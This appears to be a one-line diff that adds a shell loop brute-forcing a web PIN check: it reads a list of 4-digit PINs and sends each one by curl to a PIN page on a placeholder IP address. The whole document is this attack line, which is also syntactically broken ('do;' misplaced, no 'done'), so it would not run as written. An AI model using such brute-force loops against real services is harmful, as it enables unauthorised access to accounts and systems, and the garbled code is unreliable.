@@ -1,0 +1,1 @@
+for i in `cat 4-digit-pin-list.txt` do; curl -v http://X.X.X.X/pin/pin.php?pin=$i
